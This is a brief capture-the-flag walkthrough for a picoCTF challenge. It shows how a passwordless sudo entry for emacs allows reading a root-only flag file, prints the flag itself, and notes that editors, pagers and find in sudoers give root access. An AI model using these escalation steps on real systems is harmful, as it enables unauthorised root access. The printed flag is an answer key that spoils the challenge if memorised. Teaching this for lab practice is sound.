# SUDO MAKE ME A SANDWICH PROBLEM GUIDE:

*(General Skills — Easy, 50pt)*

## HINTS:
Hint 1: Title says it — what can you run with `sudo`?

## TOOLS:
`$ sudo -l`

`$ sudo /bin/emacs flag.txt`

## WALKTHROUGH:
1. `$ ls`
    - `flag.txt` is there but not readable as your user

2. `$ sudo -l`
    - Lists what the current user may run as root:
        - `(ALL) NOPASSWD: /bin/emacs`
        - You can launch emacs as root with no password

3. `$ sudo /bin/emacs flag.txt`
    - Opens the flag file inside a root emacs session
        - Answer: `picoCTF{ju57_5ud0_17_cce7a3f7}`

## NOTES:
- `sudo -l` is the first move on any privilege-escalation box. A `NOPASSWD` entry for an editor, pager, or interpreter is a direct root read.
- Any program that can open a file or spawn a shell (emacs, vim, nano, less, find) becomes a root file-read when it's in the sudoers list. See GTFOBins.
